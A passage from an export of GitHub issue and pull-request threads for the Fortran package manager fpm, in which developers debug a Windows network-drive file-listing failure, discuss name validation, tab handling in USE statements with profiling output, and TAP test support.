thing:\nZ:\\Homes\\PAR3\\Documents\\GitHub\\BUG>dir /b\napp\nsrc\ntest\nfpm 0.3.0.exe\nREADME.md\nbuild\nfpm.exe\nfpm.toml\nAnd:\nZ:\\Homes\\PAR3\\Documents\\GitHub\\BUG>dir /n /b\napp\nsrc\ntest\nfpm 0.3.0.exe\nREADME.md\nbuild\nfpm.exe\nfpm.toml\nFinally:\nZ:\\Homes\\PAR3\\Documents\\GitHub\\BUG>dir /n\n Volume in drive Z is shared\n Volume Serial Number is 6DA5-DA4F\n\n Directory of Z:\\Homes\\PAR3\\Documents\\GitHub\\BUG\n\n07/14/2021  07:41 AM    <DIR>          .\n07/14/2021  07:37 AM    <DIR>          ..\n07/10/2021  04:08 PM    <DIR>          app\n07/10/2021  04:08 PM    <DIR>          src\n07/10/2021  04:08 PM    <DIR>          test\n07/10/2021  03:29 PM         2,909,097 fpm 0.3.0.exe\n07/10/2021  04:08 PM                29 README.md\n07/10/2021  04:11 PM    <DIR>          build\n07/14/2021  03:41 PM         3,272,704 fpm.exe\n07/10/2021  04:10 PM               230 fpm.toml\n               4 File(s)      6,182,060 bytes\n               6 Dir(s)  2,603,511,185,408 bytes free\nIf I change line 6535 to:\n            call execute_command_line('dir /n /b ' // windows_path(dir) // ' > ' // temp_file, &\n                                      exitstat=stat)\nSame error as above:\nZ:\\Homes\\PAR3\\Documents\\GitHub\\BUG>fpm build --compiler ifort %FLAGS%\nforrtl: severe (29): file not found, unit -136, file Z:\\Homes\\PAR3\\Documents\\GitHub\\BUG\\app\\main.f90\\main.f90\nImage              PC                Routine            Line        Source\nfpm.exe            00007FF67030B6BF  Unknown               Unknown  Unknown\nfpm.exe            00007FF6702EF923  Unknown               Unknown  Unknown\nfpm.exe            00007FF67017C108  FPM_SOURCE_PARSIN       16692  fpm_intel.F90\nfpm.exe            00007FF6701797AF  FPM_SOURCES_mp_PA       25499  fpm_intel.F90\nfpm.exe            00007FF670176618  FPM_SOURCES_mp_AD       25561  fpm_intel.F90\nfpm.exe            00007FF67014C585  FPM_mp_BUILD_MODE       26520  fpm_intel.F90\nfpm.exe            00007FF67020099A  FPM_mp_CMD_BUILD        26694  fpm_intel.F90\nfpm.exe            00007FF670141B1F  MAIN__                  27287  fpm_intel.F90\nfpm.exe            00007FF67037A6AE  Unknown               Unknown  Unknown\nfpm.exe            00007FF67037AA94  Unknown               Unknown  Unknown\nKERNEL32.DLL       00007FFDEE3284D4  Unknown               Unknown  Unknown\nntdll.dll          00007FFDEE591781  Unknown               Unknown  Unknown\nIf I change it to\n            call execute_command_line('dir /n ' // windows_path(dir) // ' > ' // temp_file, &\n                                      exitstat=stat)\nI get:\nZ:\\Homes\\PAR3\\Documents\\GitHub\\BUG>fpm build --compiler ifort %FLAGS%\nFile Not Found\nerror:*list_files*:directory listing failed\n2\nLike I said: I don't want to waste anyone's time, but I'm happy to keep trying things!"
                },
                {
                    "user": "LKedward",
                    "date": "2021-07-16 10:23:33+00:00",
                    "text": "PR #507 introduces an improved rewrite of the file-listing that does not go via the command line. I'd quite like to test it out in your environment to see if it fixes the problem - unfortunately I can't figure out how to get you a version of it to run.\n@urbanjost would you be able to put together an ifort compatible version of PR #507 including the added C source file?"
                },
                {
                    "user": "brocolis",
                    "date": "2021-07-16 11:44:11+00:00",
                    "text": "@LKedward, I think PR #507 with .c file won't compile with ifort/Visual Studio due to lack of dirent.h in Visual Studio."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2021-07-16 11:57:39+00:00",
                    "text": "For Visual Studio you need direct.h, indeed.\n\nOp vr 16 jul. 2021 om 13:44 schreef Carlos Une ***@***.***>:\n\u2026\n @LKedward <https://github.com/LKedward>, I think PR #507\n <#507> with .c file won't compile\n with ifort/Visual Studio due to lack of dirent.h in Visual Studio.\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#512 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YR6OF327VQ66MF2L4ELTYALRPANCNFSM5AERRATQ>\n ."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-07-16 12:07:11+00:00",
                    "text": "There is https://github.com/tronkko/dirent for Windows, which could be used."
                },
                {
                    "user": "praynaud",
                    "date": "2021-07-16 14:11:00+00:00",
                    "text": "@LKedward @brocolis @arjenmarkus @awvwgk Please provide instructions on what to do and I'll give it a shot.\nThere may be a delay on my end because I will be traveling from 7/21 to 8/12, and will not have access to any of my work.  If we can't resolve before 7/21, we can puck up in the second half of August. Apologies for that."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2021-07-16 15:07:02+00:00",
                    "text": "I was able to compile the latest commit on PR #507 with gfortran on Windows. Give the attached executable a try and let us know how it goes.\nfpm-f884bfd38a546dba12ccabcce8581e7bab29e51f.exe.txt"
                },
                {
                    "user": "urbanjost",
                    "date": "2021-07-16 20:21:13+00:00",
                    "text": "Looks like you might be past this point.  I made a clean break from the production version and changed it to compile with ifort just for testing with this.  There are a number of changes required that would make enough conflicts with the current stack of PR requests that I would prefer to do some tests with this first and then if it is desirable I can reintegrate it.  I was going to patch in the C routines  (this is basically just the current version with a jump forward with a few of the pending PRs merged and the changes to work with ifort(1)).  Is this still needed?\nhttps://github.com/urbanjost/fpm-intel.git"
                },
                {
                    "user": "praynaud",
                    "date": "2021-07-16 20:25:40+00:00",
                    "text": "@everythingfunctional @urbanjost @LKedward\nThe executable posted y @everythingfunctional works! I tried it on my minimal example BUG, as well as two other projects I am working on (FAVPRO and VESPER, Brad will know what I am talking about). All 3 were previously failing, and everything works now.\nThanks!"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2021-07-16 20:31:38+00:00",
                    "text": "I guess that means we need to get PR #507 merged in sooner rather than later."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-07-16 22:21:15+00:00",
                    "text": "Still curious what the original issue was, which is now almost certainly related to the DIR output. I had not finished it, but if you have a moment to build and run  https://github.com/urbanjost/fpm-tools/blob/main/tools/bootstrap/fpm_intel_debug.F90 I am curious what the output shows. It would still be useful to know for a single-file bootstrap version to identify the cause of the original problem."
                },
                {
                    "user": "LKedward",
                    "date": "2021-07-17 18:42:48+00:00",
                    "text": "Still curious what the original issue was, which is now almost certainly related to the DIR output.\n\nI just had a thought that it could be related to the custom is_dir function which is called from list_files. It relies on the Windows command line distinguishing a file from a folder by the presence of a trailing backslash which is perhaps not very robust.\nEdit: ah yes it looks like this methodology doesn't work on network drives."
                },
                {
                    "user": "praynaud",
                    "date": "2021-07-20 01:16:32+00:00",
                    "text": "@LKedward I suppose technically, all drives are virtual network drives in our AWS cloud, which could indeed explain the source of the problem."
                },
                {
                    "user": "praynaud",
                    "date": "2021-07-20 01:42:47+00:00",
                    "text": "@urbanjost I compiled fpm_intel_debug.F90:\nZ:\\Homes\\PAR3\\Documents\\GitHub\\FPM_test>ifort /fpp /traceback fpm_intel_debug.F90 -o fpm\nIntel(R) Fortran Intel(R) 64 Compiler Classic for applications running on Intel(R) 64, Version 2021.2.0 Build 20210228_000000\nCopyright (C) 1985-2021 Intel Corporation.  All rights reserved.\n\nfpm_intel_debug.F90(5014): remark #8291: Recommended relationship between field width 'W' and the number of fractional digits 'D' in this edit descriptor is 'W>=D+7'.\n         read(nan_string,'(g3.3)')valu\n----------------------------^\nfpm_intel_debug.F90(13860): warning #6843: A dummy argument with an explicit INTENT(OUT) declaration is not given an explicit value.   [SELF]\nsubroutine new_keyval(self)\n----------------------^\nMicrosoft (R) Incremental Linker Version 14.28.29913.0\nCopyright (C) Microsoft Corporation.  All rights reserved.\n\n-out:fpm.exe\n-subsystem:console\n-incremental:no\nfpm_intel_debug.obj\nAfter copying the newly created fpm.exe in my test folder for the minimal problem called BUG, still what I think is the same issue:\nZ:\\Homes\\PAR3\\Documents\\GitHub\\BUG>set FLAGS= --flag \"/standard-semantics /Qcoarray=single /Z7 /fpp /traceback\"\n\nZ:\\Homes\\PAR3\\Documents\\GitHub\\BUG>fpm build --compiler ifort %FLAGS%\n + mkdir build\\dependencies\n DEBUG:LIST_FILES:app\nmain.f90\n DEBUG:SHOW TEMP_FILE:\n DEBUG:FILES:main.f90\n DEBUG:DIR:app\n DEBUG:JOIN:app\\main.f90\n DEBUG:SUBDIR:\n DEBUG:LIST_FILES:app\\main.f90\nmain.f90\n DEBUG:SHOW TEMP_FILE:\n DEBUG:FILES:main.f90\n DEBUG:DIR:app\\main.f90\n DEBUG:JOIN:app\\main.f90\\main.f90\n DEBUG:FILES ON EXIT:           2\nforrtl: severe (157): Program Exception - access violation\nImage              PC                Routine            Line        Source\nfpm.exe            00007FF7956C1880  Unknown               Unknown  Unknown\nfpm.exe            00007FF795633B35  Unknown               Unknown  Unknown\nfpm.exe            00007FF7954D2739  FPM_FILESYSTEM_mp       12496  fpm_intel_debug.F90\nfpm.exe            00007FF7954D2FC8  FPM_FILESYSTEM_mp       12486  fpm_intel_debug.F90\nfpm.exe            00007FF7954C5547  FPM_SOURCES_mp_AD       25337  fpm_intel_debug.F90\nfpm.exe            00007FF79549C345  FPM_mp_BUILD_MODE       25580  fpm_intel_debug.F90\nfpm.exe            00007FF795550ADA  FPM_mp_CMD_BUILD        25754  fpm_intel_debug.F90\nfpm.exe            00007FF795491B1F  MAIN__                  26965  fpm_intel_debug.F90\nfpm.exe            00007FF7956C908E  Unknown               Unknown  Unknown\nfpm.exe            00007FF7956C9474  Unknown               Unknown  Unknown\nKERNEL32.DLL       00007FFD92E284D4  Unknown               Unknown  Unknown\nntdll.dll          00007FFD93091781  Unknown               Unknown  Unknown"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2021-07-20 11:57:25+00:00",
                    "text": "I'm not as familiar with that debug output, so @urbanjost will have to correct me if I'm wrong, but I'd say it looks like it confirms @LKedward's theory. The next question would be how to work around it in the Fortran-only version."
                },
                {
                    "user": "LKedward",
                    "date": "2021-07-20 12:44:19+00:00",
                    "text": "Yes I think that does confirm what I was thinking.\n\nThe next question would be how to work around it in the Fortran-only version.\n\nFortunately, we can always bootstrap a Windows version on a newer version of Windows such as in the CI. But a possible fix could be to replace the recursive list_files routine with a non-recursive one that invokes the Windows dir command once such that it lists files recursively. I think maybe: > dir /B /S dirname."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-07-20 23:06:08+00:00",
                    "text": "Yes, it confirms @LKedward.  It is the is_dir function. I am not a heavy MSWIndows user, but my PC \"goto\" suggested from what I described to him that possibly using DIR in two passes, once with dir /A:-D/B to list non-directory files, and once with dir /A:D/B to list directories might be a solution, or a FIND command looking for *.f90 and *.F90 files, but I have not tried exploring that."
                }
            ]
        },
        {
            "number": 511,
            "user": "urbanjost",
            "date": "2021-07-09 19:12:31+00:00",
            "title": "check name used for package, executable, test, or example",
            "text": "fpm manifest files can contain names that produce errors or complicate keeping the package portable. The names are used as parts of file names and even module names but are not tested for spaces, slashes, and other special characters. Although there may be interest in allowing Unicode names or other syntax in the future, fpm will generally produce errors internally if anything other than ASCII alphanumeric characters are used for names, plus a hythen and underscore; and names should start with a letter.\nThis adds such a check and also replaces ERROR STOP calls with STOP calls, which is generally distracting and usually not useful; although it has been useful during early development of fpm for developers.\nThis should prevent the problems described in #503, although adding such a note to the documentation would be appropriate as well. Closes #331  \"feature\" also.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2021-07-10 09:25:15+00:00",
                    "text": "Thanks @urbanjost - this all looks fine with me, but I can't remember whether we discussed what the rules are for package names since this PR tightens those rules considerably."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-07-10 16:47:31+00:00",
                    "text": "The same rules have been enforced in the new subcommand for quite a while, with the recent change to allow hyphens.  When using new the name is actually used for directory names and module names and so it can be very problematic to allow other characters; and although it could be changed it is used in system commands so spaces, asterisks, and other characters become problematic very quickly; but this issue even appeared in the tests where some of the test names contained a pound character (#).  So the only way to get a non-conforming name has been to manually create or edit the fpm.toml file for quite a while; but I did a scan of github trying to see if I could find a package it would break because this inconsistency has probably become a feature for someone by now, and did not find one.\nI generally use one of several libraries for messages and errors so making a separate error message routine seems like a good\nlong-term idea; and would allow for support of multiple languages and color and verbose mode doing an error stop versus regular mode doing a stop, etc. In this case I was trying to minimize the changes but up until recently the error messages were more for the developer than the user so something fancier would be good, but was just trying to do an incremental improvement here on that aspect of things and just get a warning message to the user that would solve the PR.  Had been hoping something like a full blown message system would emerge via stdlib.  I could turn one of mine into an fpm package, or we could look at where stdlib stands on this; but while doing this I thought it would complicate the issue a bit at that time; and related PRs (adding color as in one of the other PRs would start laying the groundwork for a message handling system, for example) I did not start going down that path yet, but yes, I think the messaging/error handling is ripe for a revamp now that so much more is production-ready."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-07-11 20:57:57+00:00",
                    "text": "@awvwgk Don't want to conflate this PR too much, but took a first step towards addressing some of the messaging per above; so all STOPs are via FPM_STOP.  Makes it a lot easier to control the format/action takens and standardize the appearance of the messages.  Can dress it up  a bit with colors and a traceback in verbose mode but that can be done a lot more cleanly after a few other changes are made in other PRs. Changed things enough it needs another look."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-07-11 22:26:01+00:00",
                    "text": "PR is removed from version information, and I replaced all the remaining STOP calls with FPM_STOP.  I want to make a more generic verbose mode, and then FPM_STOP can conditionally call ERROR STOP, or perhaps use color. Thinking taking an array instead of a single string would allow for longer messages with info like a pointer to the column where the error occurs as mentioned, but want to do that in a separate PR if the latest few work out (they are indirectly related to doing that). Hopefully this gets everything in position for that."
                }
            ]
        },
        {
            "number": 510,
            "user": "urbanjost",
            "date": "2021-07-09 12:47:50+00:00",
            "title": "Expand tabs when parsing for USE, INCLUDE, MODULE statements",
            "text": "Simple PR to close #508",
            "comments": [
                {
                    "user": "urbanjost",
                    "date": "2021-07-10 15:57:17+00:00",
                    "text": "The short answer is that using the general-purpose-fortran package as a test, with 1136 source files and around 282 000, lines of source it is noise level.\nDuring a full rebuild the time is so dominated by the calls to system commands (particularly the compiler) the time in the program is insignificant, so the timing only becomes significant during a build or run|test of something essentially already built. In those cases it adds less than 1/10 of a second.\nThere is room, as the OP (Original Poster) noted,  to combine the adjustl/lower/notabs ops at the time of reading the file, possibly removing full comment lines or lines not containing any of the keywords; with the hash having to be done first or seperately. The fpm time itself is most noticeable at a human level when doing repeated \"fpm run\" commands; but the system commands searching for the files still dominate that time.\nOptimizing would be fruitful but also having a switch on run that bypasses the rebuild would probably be more effective at a macro level; like earlier versions did before the auto-build. But assuming you commonly want the rebuild and would install the apps the impact of speeding up fpm would be most felt when running many tests or executables at once.  I did not check but I assume the rebuild check only occurs once. If it happens for each executable invocation that would add up.  That just occurred to me, and easy to check.\nI had not profiled everything for a while as performance has been quite satisfactory for my usage patterns;  I will take a better look. I have quite a bit of profiling runs built in to some tests, and profiling numbers always have to be read aware of how cache affects I/O, and so on.  But at least on Linux it added very little time.\nSo no one should read too much into the following gprof output of a build when everything is up to date except that the average real time barely changed (and was actually slightly faster with the expand version, which is just noise) and that the time spent in notabs for a good sized package is 0.06 seconds f ...\nRebuild on Linux with gfortran\nexpand  avg:: real      0m2.541s user   0m2.378s sys    0m0.172s\ndefault avg:: real      0m2.613s user   0m2.446s sys    0m0.185s\nFlat profile: expand\nEach sample counts as 0.01 seconds.\n  %   cumulative   self              self     total\n time   seconds   seconds    calls  ms/call  ms/call  name\n 60.87      0.42     0.42  3291871     0.00     0.00  __fpm_strings_MOD_lower\n 13.04      0.51     0.09     1137     0.08     0.54  __fpm_source_parsing_MOD_parse_f_source\n  8.70      0.57     0.06   283268     0.00     0.00  __fpm_strings_MOD_notabs\n  4.35      0.60     0.03   306587     0.00     0.00  __fpm_strings_MOD_fnv_1a_char\n  4.35      0.63     0.03     2263     0.01     0.01  __fpm_targets_MOD_find_module_dependency\n  4.35      0.66     0.03     2259     0.01     0.01  __fpm_targets_MOD_add_target\n  1.45      0.67     0.01    10167     0.00     0.00  __fpm_strings_MOD_split\n  1.45      0.68     0.01     4518     0.00     0.00  __fpm_targets_MOD_add_dependency\n  1.45      0.69     0.01     1137     0.01     0.06  __fpm_filesystem_MOD_read_lines_expanded\n  0.00      0.69     0.00    23443     0.00     0.00  __fpm_filesystem_MOD_dirname\n  0.00      0.69     0.00     8433     0.00     0.00  __fpm_source_parsing_MOD_split_n\nFlat profile: default\nEach sample counts as 0.01 seconds.\n  %   cumulative   self              self     total\n time   seconds   seconds    calls  ms/call  ms/call  name\n 67.11      0.51     0.51  3291871     0.00     0.00  __fpm_strings_MOD_lower\n  6.58      0.56     0.05   306587     0.00     0.00  __fpm_strings_MOD_fnv_1a_char\n  6.58      0.61     0.05     2263     0.02     0.02  __fpm_targets_MOD_find_module_dependency\n  6.58      0.66     0.05     1137     0.04     0.58  __fpm_source_parsing_MOD_parse_f_source\n  3.95      0.69     0.03     2259     0.01     0.01  __fpm_targets_MOD_add_target\n  2.63      0.71     0.02     1225     0.02     0.02  __fpm_filesystem_MOD_read_lines\n  1.32      0.72     0.01     6335     0.00     0.01  __fpm_source_parsing_MOD_parse_c_source\n  1.32      0.73     0.01     4649     0.00     0.00  __fpm_filesystem_MOD_canon_path\n  1.32      0.74     0.01     1225     0.01     0.01  __fpm_filesystem_MOD_number_of_rows\n  1.32      0.75     0.01     1210     0.01     0.05  __fpm_strings_MOD_fnv_1a_string_t\n  1.32      0.76     0.01     1050     0.01     0.01  __fpm_filesystem_MOD_basename\n  0.00      0.76     0.00    23443     0.00     0.00  __fpm_filesystem_MOD_dirname\n  0.00      0.76     0.00    10167     0.00     0.00  __fpm_strings_MOD_split\n  0.00      0.76     0.00     8433     0.00     0.00  __fpm_source_parsing_MOD_split_n"
                },
                {
                    "user": "LKedward",
                    "date": "2021-07-16 10:09:40+00:00",
                    "text": "Thanks for the detailed reply John @urbanjost - that's good to hear. This looks good to me - I'll approve once the conflicts are resolved."
                },
                {
                    "user": "LKedward",
                    "date": "2021-07-17 18:54:12+00:00",
                    "text": "Thanks @urbanjost - just noticing this PR looks very different all of a sudden, did you accidently merge in a different branch? I can see lot's of changes adding fpm_stop. Are you able to open a separate PR for those?"
                }
            ]
        },
        {
            "number": 509,
            "user": "awvwgk",
            "date": "2021-07-07 18:32:59+00:00",
            "title": "Support test anything protocol (TAP) in fpm test",
            "text": "Test anything protocol: https://testanything.org/\nIt would be nice if fpm test could provide a TAP consumer when running the testsuite. Having to pipe the fpm test output through a TAP consumer or have a TAP consumer as --runner is quite error prone in case somebody forgets to add those as TAP tests always exit with error code zero.\nFpm could detect TAP automatically or require to enable it on per test basis with:\n[[test]]\nname = \"tap-producer\"\ntap = true",
            "comments": [
                {
                    "user": "ivan-pi",
                    "date": "2021-07-08 12:39:23+00:00",
                    "text": "Can you clarify how would TAP be detected automatically?\nI presume the test main program would import the module definitions with use tap (or use fpm_tap if we could implement our own TAP layer).\nIn any case I like the succinctness of tap = true."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-07-08 12:48:43+00:00",
                    "text": "The TAP output is quite distinct, we could capture the standard output of the test and check for the first line starting with 1.., which indicates that we are using TAP. Capturing standard output shouldn't introduce a delay, this has to be designed rather carefully."
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-07-08 14:16:45+00:00",
                    "text": "That sounds reasonable, but I don't think the interest in TAP among all FPM users will be big enough to make it enabled by default. The explicit approach sounds better to me.\nA compromise could be to have a project-wide setting auto-tap = true that would turn on automatic TAP consumption for all tests. Tests which are not TAP would then need to be disabled explicitly with tap = false. But I fear this is already getting too confusing."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2021-07-08 15:04:16+00:00",
                    "text": "This is an interesting idea. I would expect fpm would be a TAP consumer, but maybe it should just support TAP consumers as plugins? I also like the idea of being explicit about which tests provide TAP output, as that would be much easier than trying to guess based on its output.\nI read the TAP specification, and there are some complexities that would encourage us not to try and reinvent our own parser, not least of which being that it would need to include a yaml parser. Also, the version specifier at the start is optional, and the plan line may appear at the start of output, the end of output, or not at all, so it's not sufficient for determining whether the output is TAP.\nIf this is something that moves forward, I might be interested in developing a vegetables spin-off that is (at least initially) API compatible with the current vegetables, but produces TAP output. The only thing I don't like about TAP is that it doesn't seem to provide any nice way of organizing tests in a hierarchical way, but a test suite that is organized hierarchically can be flattened without too much difficulty."
                }
            ]
        },
        {
            "number": 508,
            "user": "SoupOfDepression",
            "date": "2021-06-30 17:25:12+00:00",
            "title": "FPM fails to find dependency if use statement is proceeded by tab",
            "text": "While attempting to use FPM for the first time, I figured out that it does not recognize a use statement if you place a tab before the use statement. This can be quite confusing if you are used to using a compiler that allows you to use tabs (such as gfortran.) This is also the case for include statements.\nprogram main\nuse helloff\nend program main\n\nWill compile fine (if fpm.toml is correct) while\nprogram main\n\tuse helloff\nend program main\n\nwill give you\nFatal Error: Cannot open module file \u2018helloff.mod\u2019 for reading at (1): No such file or directory compilation terminated.\nno matter what you specify in fpm.toml.\nThis is because adjustl is used when testing for use statements, which removes spaces, but ignores tabs. (FPM also uses adjustl while testing for both use and include statements instead of right after reading the lines from the file, making the adjustl run many more times than required, so it might be a good idea to change the way it deals with indentation even if tabs don't get supported)",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2021-06-30 17:41:05+00:00",
                    "text": "Thanks, I can reproduce with fpm-0.3.0. GFortran also issues a warning:\napp/main.f90:2:1:\n\n    2 |  use tabs, only: say_hello\n      | 1\nWarning: Nonconforming tab character at (1) [-Wtabs]\n\nI didn't know tab was non-conforming. :)\nSo, I think this will be an fpm design decision whether to treat this as a bug (tabs are okay) or to improve the parsing and error message to catch this gracefully (tabs are not okay)."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-06-30 19:01:01+00:00",
                    "text": "I'm for tabs are not okay :P\nJoke aside, allowing tabs in the source code is probably easier than creating a dedicated and meaningful error for those, let's leave it to the Fortran compiler to complain about those.\nFixing the source_parsing to allow tabs as whitespace could be a good first issue, if somebody wants to pick this up. From my understanding, the issue boils down to the usage of the intrinsics like trim and adjustl to strip spaces, instead we could use strip and chomp from stdlib to strip all whitespace consistently. Also, the delims passed to split_n have to be expanded as well."
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-06-30 22:51:56+00:00",
                    "text": "This can be quite confusing if you are used to using a compiler that allows you to use tabs (such as gfortran.)\n\nSince tabs will be a source of non-portability for your fpm package I would highly recommend to set your text editor to emit spaces when pressing the tab key.\nOtherwise I agree with @awvwgk, it is easier to let this fail in the compilation stage."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-07-09 12:44:08+00:00",
                    "text": "As tabs could cause issues in other locations in the USE,INCLUDE, MODULE lines expanding them for the Fortran input files seems appropriate, so I added the M_strings procedure notabs(3f). I did not also in the same routine do the adjustl and lower\nas it would affect the hash value in a possibly significant way and prevent recompilation.  This change would also cause a source file that had tabs added/deleted to appear unchanged as well, but I cannot think of a problem with that except that some compilers might treat a tab as a space, so expanding it assuming tab stops every eight characters might produce a line that is \"too long\" if the compiler is called with a line length restriction (which is essentially going away as a limit in future Fortran standards, by the way), although reducing the calls to LOWER(3f) and ADJUSTL(3f) does seem like a good idea and could be done once on the entire array, with a call to READ_LINES_EXPANDED used for parsing input with everything adjusted and lowercase-ed and a call to READ_LINES done just for the hash. That would also eliminate not recompiling if the file contains new tabs or has tabs removed. But at least on my machine using the rather large general-purpose-fortran fpm package as a test the timing difference seemed unnoticeable, so I went for minimal changes.\nSo #510 should handle this explicitly, although using regular expressions might clear up a few outliers not currently handled.\nIf anyone sees a more significant timing difference on other platforms  please let me know."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-07-09 13:09:38+00:00",
                    "text": "PS;  I did an \"fpm new A\" and changed all the space characters to tabs and built with ifort, gfortran, and nvfortran and ifort and nvfortran built with all the tabs and gfortran built when I changed the tab between \"print\" and \"*\"  (perhaps a gfortran bug, since it tolerates tab characters everywhere else in the simple code tested?). Since tolerating tabs seemed very common leaving it up to the compiler seemed reasonable, but the read_lines_expanded(3f) procedure could easily warn about tab characters in a compiler-independent way.  Does that seem like a good idea?"
                },
                {
                    "user": "urbanjost",
                    "date": "2021-07-09 20:40:54+00:00",
                    "text": "Incidental, but so no one duplicates it I reported the minor issue with a tab in a PRINT statement in gfortran 9.3.\nhttps://gcc.gnu.org/bugzilla/show_bug.cgi?id=101399"
                },
                {
                    "user": "urbanjost",
                    "date": "2021-07-09 20:44:11+00:00",
                    "text": "For those who want to expand tab characters from the command line, note ULS have the command expand(1) as one method for removing horizontal tab characters."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-07-09 22:12:29+00:00",
                    "text": "At least on my machine a large build is dominated by the compiler and external system commands, but the parsing function and calls to lowercase the input files definitely does dominate the time consumed. The output of gprof for a large build follows ...\nFlat profile:\n\nEach sample counts as 0.01 seconds.\n  %   cumulative   self              self     total           \n time   seconds   seconds    calls  ms/call  ms/call  name    \n 61.54      0.40     0.40  3166307     0.00     0.00  __fpm_strings_MOD_lower\n 13.85      0.49     0.09     1137     0.08     0.49  __fpm_source_parsing_MOD_parse_f_source\n  9.23      0.55     0.06   306587     0.00     0.00  __fpm_strings_MOD_fnv_1a_char\n  6.15      0.59     0.04     2263     0.02     0.02  __fpm_targets_MOD_find_module_dependency\n  6.15      0.63     0.04     2259     0.02     0.02  __fpm_targets_MOD_add_target\n  1.54      0.64     0.01     1225     0.01     0.01  __fpm_filesystem_MOD_read_lines\n  1.54      0.65     0.01     1210     0.01     0.06  __fpm_strings_MOD_fnv_1a_string_t\n  0.00      0.65     0.00    26343     0.00     0.00  __fpm_filesystem_MOD_dirname\n  0.00      0.65     0.00    10167     0.00     0.00  __fpm_strings_MOD_split\n  0.00      0.65     0.00     8433     0.00     0.00  __fpm_source_parsing_MOD_split_n\n  0.00      0.65     0.00     7836     0.00     0.00  __fpm_filesystem_MOD_exists\n  0.00      0.65     0.00     7555     0.00     0.00  __fpm_strings_MOD_string_array_contains\n  0.00      0.65     0.00     6265     0.00     0.00  __fpm_strings_MOD_is_fortran_name\n  0.00      0.65     0.00     5266     0.00     0.00  __fpm_strings_MOD_str_ends_with_str\n  0.00      0.65     0.00     4856     0.00     0.00  __fpm_environment_MOD_get_os_type\n  0.00      0.65     0.00     4649     0.00     0.00  __fpm_filesystem_MOD_canon_path\n  0.00      0.65     0.00     4649     0.00     0.00  __fpm_filesystem_MOD_unix_path\n  0.00      0.65     0.00     4518     0.00     0.00  __fpm_targets_MOD_add_dependency\n  0.00      0.65     0.00     3805     0.00     0.00  __fpm_strings_MOD_str_ends_with_any"
                },
                {
                    "user": "LKedward",
                    "date": "2021-07-10 09:17:59+00:00",
                    "text": "I assume you're on a non-windows machine then @urbanjost - yes outside of Windows, the source parsing is very much the dominating process. I'm working on a refactor to improve this slightly."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-07-11 01:09:19+00:00",
                    "text": "OK. I was going to refactor it a bit to reduce the calls to lower and a few other things but if you are already looking at that I will not. I have a MSWindows machine now, but generally only use it to check the portability of software developed in ULS platforms."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-07-11 02:28:56+00:00",
                    "text": "PS:  A simplistic approach to reducing the number of calls to lower(3f)  I had already tried where I just made a duplicate of file_lines as soon as file_lines was created (because  I needed INCLUDE #include lines to retain their case because of file names) did show a drop from 0.69 to 0.27 seconds on an \"fpm build\" when everything was already up to date, which was significant on a large build like the  general-purpose-fortran package. The same run as above with just that change produced\n Flat profile:\n\nEach sample counts as 0.01 seconds.\n  %   cumulative   self              self     total           \n time   seconds   seconds    calls  ms/call  ms/call  name    \n 22.22      0.06     0.06     1137     0.05     0.14  __fpm_source_parsing_MOD_parse_f_source\n 20.37      0.12     0.06   306587     0.00     0.00  __fpm_strings_MOD_fnv_1a_char\n 18.52      0.17     0.05     2263     0.02     0.02  __fpm_targets_MOD_find_module_dependency\n 14.81      0.21     0.04   333783     0.00     0.00  __fpm_strings_MOD_lower\n 14.81      0.25     0.04     2259     0.02     0.02  __fpm_targets_MOD_add_target\n  3.70      0.26     0.01    10167     0.00     0.00  __fpm_strings_MOD_split\n  3.70      0.27     0.01     7555     0.00     0.00  __fpm_strings_MOD_string_array_contains\n  1.85      0.27     0.01     1210     0.00     0.05  __fpm_strings_MOD_fnv_1a_string_t\n  0.00      0.27     0.00    23443     0.00     0.00  __fpm_filesystem_MOD_dirname\n  0.00      0.27     0.00     8433     0.00     0.00  __fpm_source_parsing_MOD_split_n\n  0.00      0.27     0.00     6265     0.00     0.00  __fpm_strings_MOD_is_fortran_name\n  0.00      0.27     0.00     5577     0.00     0.00  __fpm_filesystem_MOD_exists\n\nthat is a pretty big build so probably not typical, but it was a noticeable change."
                },
                {
                    "user": "LKedward",
                    "date": "2021-07-11 08:37:49+00:00",
                    "text": "I was going to refactor it a bit to reduce the calls to lower and a few other things but if you are already looking at that I will not.\n\nPlease do go ahead and submit your patch to improve this @urbanjost! (My refactoring is at a higher level to restructure the routines and allow other issues to be addressed, so I don't think there'll be any conflict.)"
                },
                {
                    "user": "urbanjost",
                    "date": "2021-07-11 20:51:07+00:00",
                    "text": "A brute force approach did bring the number of calls to lower(3f)  down by a factor of ten from 3M to 300 000, and results in a little over a 8.5/100 reduction in time in the fpm routines, so thanks to @SoupOfDepression for mentioning that!  If the PR is accepted that actually produces a message and enforces the name only allowed to be an alphanumeric starting with a letter except for allowing hypens and dashes I'll update the documentation too;  although hopefully getting the message when trying to use a non-conforming name would have prevented confusion.  I had a similiar issue in the past when I could not tell if names for executables could be pathnames that overrode being placed in the build directory quite a while ago, especially because it \"worked\". Now I know how that would not be a good \"feature\" if you want to keep different profile builds separate (and would have security issues if it allowed full pathnames, but the names were treated as relative to the package top). Added a minimal change to the PR, but don't want to conflate it too much or might delay getting the fix in. Will tune that up a little more once a few existing PRs come or go."
                },
                {
